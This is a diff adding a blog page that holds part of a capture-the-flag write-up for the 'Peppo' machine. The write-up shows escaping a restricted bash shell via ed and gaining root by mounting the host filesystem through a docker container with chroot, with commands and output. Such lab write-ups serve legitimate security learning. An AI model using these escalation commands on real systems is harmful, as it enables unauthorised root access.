+</span></span><span class="line"><span class="cl">_tilde
+</span></span><span class="line"><span class="cl">_uids
+</span></span><span class="line"><span class="cl">_upvar
+</span></span><span class="line"><span class="cl">_upvars
+</span></span><span class="line"><span class="cl">_usb_ids
+</span></span><span class="line"><span class="cl">_user_at_host
+</span></span><span class="line"><span class="cl">_usergroup
+</span></span><span class="line"><span class="cl">_userland
+</span></span><span class="line"><span class="cl">_variables
+</span></span><span class="line"><span class="cl">_xfunc
+</span></span><span class="line"><span class="cl">_xinetd_services
+</span></span><span class="line"><span class="cl">dequote
+</span></span><span class="line"><span class="cl">quote
+</span></span><span class="line"><span class="cl">quote_readline
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>
+</span></span><span class="line"><span class="cl"><span class="nb">alias</span>
+</span></span><span class="line"><span class="cl"><span class="nb">bg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">bind</span>
+</span></span><span class="line"><span class="cl"><span class="nb">break</span>
+</span></span><span class="line"><span class="cl"><span class="nb">builtin</span>
+</span></span><span class="line"><span class="cl"><span class="nb">caller</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">command</span>
+</span></span><span class="line"><span class="cl"><span class="nb">compgen</span>
+</span></span><span class="line"><span class="cl"><span class="nb">complete</span>
+</span></span><span class="line"><span class="cl">compopt
+</span></span><span class="line"><span class="cl"><span class="k">continue</span>
+</span></span><span class="line"><span class="cl"><span class="nb">declare</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dirs</span>
+</span></span><span class="line"><span class="cl"><span class="nb">disown</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span>
+</span></span><span class="line"><span class="cl"><span class="nb">enable</span>
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span>
+</span></span><span class="line"><span class="cl"><span class="nb">false</span>
+</span></span><span class="line"><span class="cl"><span class="nb">fc</span>
+</span></span><span class="line"><span class="cl"><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">getopts</span>
+</span></span><span class="line"><span class="cl"><span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="nb">help</span>
+</span></span><span class="line"><span class="cl"><span class="nb">history</span>
+</span></span><span class="line"><span class="cl"><span class="nb">jobs</span>
+</span></span><span class="line"><span class="cl"><span class="nb">kill</span>
+</span></span><span class="line"><span class="cl"><span class="nb">let</span>
+</span></span><span class="line"><span class="cl"><span class="nb">local</span>
+</span></span><span class="line"><span class="cl"><span class="nb">logout</span>
+</span></span><span class="line"><span class="cl">mapfile
+</span></span><span class="line"><span class="cl"><span class="nb">popd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">printf</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pushd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">read</span>
+</span></span><span class="line"><span class="cl">readarray
+</span></span><span class="line"><span class="cl"><span class="nb">readonly</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="nb">shift</span>
+</span></span><span class="line"><span class="cl"><span class="nb">shopt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">source</span>
+</span></span><span class="line"><span class="cl"><span class="nb">suspend</span>
+</span></span><span class="line"><span class="cl"><span class="nb">test</span>
+</span></span><span class="line"><span class="cl"><span class="nb">times</span>
+</span></span><span class="line"><span class="cl"><span class="nb">trap</span>
+</span></span><span class="line"><span class="cl"><span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type</span>
+</span></span><span class="line"><span class="cl"><span class="nb">typeset</span>
+</span></span><span class="line"><span class="cl"><span class="nb">ulimit</span>
+</span></span><span class="line"><span class="cl"><span class="nb">umask</span>
+</span></span><span class="line"><span class="cl"><span class="nb">unalias</span>
+</span></span><span class="line"><span class="cl"><span class="nb">unset</span>
+</span></span><span class="line"><span class="cl"><span class="nb">wait</span>
+</span></span><span class="line"><span class="cl">sleep
+</span></span><span class="line"><span class="cl">chown
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">chmod
+</span></span><span class="line"><span class="cl">ed
+</span></span><span class="line"><span class="cl">ping
+</span></span><span class="line"><span class="cl">touch
+</span></span><span class="line"><span class="cl">mv
+</span></span></code></pre></div><p>Here are list of executable commands</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eleanor@peppo:~$ mapfile TMP &lt; local.txt
+</span></span><span class="line"><span class="cl">eleanor@peppo:~$ <span class="nb">echo</span> <span class="nv">$TMP</span>
+</span></span><span class="line"><span class="cl">42f72803bb58fd45d033803258c09111
+</span></span></code></pre></div><p>mapfile allows you to print text.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eleanor@peppo:~$ ed 
+</span></span><span class="line"><span class="cl">!/bin/bash
+</span></span><span class="line"><span class="cl">eleanor@peppo:~$ 
+</span></span><span class="line"><span class="cl">eleanor@peppo:~$ ls
+</span></span><span class="line"><span class="cl">bin  helloworld  local.txt
+</span></span><span class="line"><span class="cl">eleanor@peppo:~$ <span class="nb">cd</span> /
+</span></span><span class="line"><span class="cl">eleanor@peppo:/$ ls
+</span></span><span class="line"><span class="cl">bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
+</span></span><span class="line"><span class="cl">boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
+</span></span></code></pre></div><p>ed command is the way to get out of the restricted shell environment.</p>
+<p>[ed</p>
+<pre><code>        |
+        
+        GTFOBins](https://gtfobins.github.io/gtfobins/ed/)
+</code></pre>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eleanor@peppo:/$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>eleanor<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>eleanor<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>eleanor<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
+</span></span><span class="line"><span class="cl">eleanor@peppo:/$ sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We trust you have received the usual lecture from the <span class="nb">local</span> System
+</span></span><span class="line"><span class="cl">Administrator. It usually boils down to these three things:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#1) Respect the privacy of others.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#2) Think before you type.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#3) With great power comes great responsibility.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> eleanor: 
+</span></span><span class="line"><span class="cl">Sorry, user eleanor may not run sudo on peppo.
+</span></span></code></pre></div><p>I can see that docker is installed in the machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">eleanor@peppo:/tmp$ docker image ls
+</span></span><span class="line"><span class="cl">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+</span></span><span class="line"><span class="cl">redmine             latest              0c8429c66e07        <span class="m">3</span> years ago         542MB
+</span></span><span class="line"><span class="cl">postgres            latest              adf2b126dda8        <span class="m">3</span> years ago         313MB
+</span></span><span class="line"><span class="cl">eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
+</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl"><span class="c1"># pwd</span>
+</span></span><span class="line"><span class="cl">/
+</span></span></code></pre></div><p>[docker</p>
+<pre><code>        |
+        
+        GTFOBins](https://gtfobins.github.io/gtfobins/docker/)
+</code></pre>
+<p>I checked the list of image and run with the command that I found in GTFO.</p>
+<h1 id="root">Root</h1>
+<p><img src="Peppo%203686053f39664308a95784e6e3c84088/Screenshot_2023-10-18_at_10.15.07.png" alt="Screenshot 2023-10-18 at 10.15.07.png"></p>
+<p>Now you pwn.</p>
+<h1 id="summary">Summary</h1>
+<p>It took me long time to figure out how to get shell, but the clue was in the nmap enumeration all the time in the first place. And shell restriction kinda freaked me out. This machine is indeed HARD level shit.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
